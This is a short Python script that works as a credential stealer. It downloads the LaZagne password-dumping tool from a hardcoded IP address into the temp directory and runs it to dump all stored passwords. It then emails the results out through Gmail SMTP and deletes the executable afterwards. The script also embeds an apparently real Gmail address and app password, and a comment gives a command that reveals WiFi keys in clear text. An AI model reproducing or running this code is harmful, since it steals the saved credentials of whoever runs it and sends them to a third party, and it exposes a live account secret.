#!/usr/bin/env python
import requests, subprocess, smtplib, os, tempfile
def download(url):
	get_respone = requests.get(url)
	file_name = url.split("/")[-1]
	with open (file_name, "wb") as out_file:
		out_file.write (get_respone.content)

def send_mail(email, password, message):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, message)
	server.quit()

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("http://192.168.190.35/python/LaZagne.exe")
###For Window###
##netsh wlan show profile wifi-name key=clear

result = subprocess.check_output("LaZagne.exe all", shell=True)
send_mail("kogyiaunglay443@gmail.com","dxarvgrqxkrcytgj",result)
os.remove("LaZagne.exe")